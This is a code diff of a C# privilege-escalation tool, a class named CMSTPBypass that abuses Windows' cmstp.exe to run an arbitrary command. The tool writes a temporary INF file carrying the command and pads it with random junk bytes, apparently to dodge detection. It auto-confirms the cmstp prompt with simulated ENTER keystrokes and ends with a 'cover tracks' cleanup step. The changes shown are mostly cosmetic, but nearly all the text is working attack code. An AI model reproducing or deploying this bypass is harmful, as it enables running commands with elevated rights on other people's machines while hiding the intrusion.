@@ -1,13 +1,16 @@
 using System;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Text;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Text;
+using System.Windows.Forms;
 
 public class CMSTPBypass
 {
-    public const string InfData = @"[version]
+    // INF file template with a placeholder for the command to execute
+    public const string InfData = @"
+[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -29,7 +32,6 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
-
 ";
 
     [DllImport("user32.dll")]
@@ -41,7 +43,8 @@ ShortSvcName=""CorpVPN""
 
     public static void Main(string[] args)
     {
-        string commandToExecute = "your_command_here"; // Replace with the actual command
+        // Replace with the actual command you want to execute
+        string commandToExecute = "your_command_here";
         Execute(commandToExecute);
     }
 
@@ -83,7 +86,7 @@ ShortSvcName=""CorpVPN""
             windowHandle = SetWindowActive("cmstp");
         } while (windowHandle == IntPtr.Zero);
 
-        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+        SendKeys.SendWait("{ENTER}");
 
         // Clean up and cover tracks
         CleanUp(infFilePath);
@@ -110,16 +113,16 @@ ShortSvcName=""CorpVPN""
         OutputFile.Append("\\");
         OutputFile.Append(RandomFileName);
         OutputFile.Append(".inf");
-        
+
         // Add junk data to the INF file
         int junkDataSize = 1024; // Adjust the size of junk data as needed
         byte[] junkData = new byte[junkDataSize];
         new Random().NextBytes(junkData);
         File.WriteAllBytes(OutputFile.ToString(), junkData);
-        
+
         // Append the actual INF content
         File.AppendAllText(OutputFile.ToString(), InfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
-        
+
         return OutputFile.ToString();
     }
 
